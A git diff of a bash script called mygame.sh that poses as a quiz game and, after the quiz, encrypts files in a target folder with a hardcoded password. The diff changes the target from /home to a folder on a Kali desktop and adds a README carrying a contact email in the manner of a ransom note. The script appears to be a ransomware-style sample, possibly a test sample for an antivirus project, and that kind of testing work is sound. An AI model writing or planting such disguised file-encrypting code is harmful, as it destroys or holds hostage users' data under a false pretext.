@@ -18,10 +18,10 @@ if [ "$user_answer" != "$correct_answer" ]; then
     exit 1
 fi
 
-echo "Correct! Access granted. Please wait for the next game. It takes 5 minutes."
+echo "Correct! Access granted. Please wait for the next game."
 
 # Continue with file encryption
-folder_to_encrypt="/home"
+folder_to_encrypt="/home/kali/Masaüstü/clam"
 password="hydradragonantivirushere"
 script_to_exclude="mygame.sh"
 
@@ -67,3 +67,7 @@ export -f decrypt_files
 find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'
 
 echo "All files have been decrypted, and encrypted files have been deleted."
+
+# Create a README.md file with contact details
+echo "Contact Information:" > README.md
+echo "Email: semaemirhan555@gmail.com" >> README.md
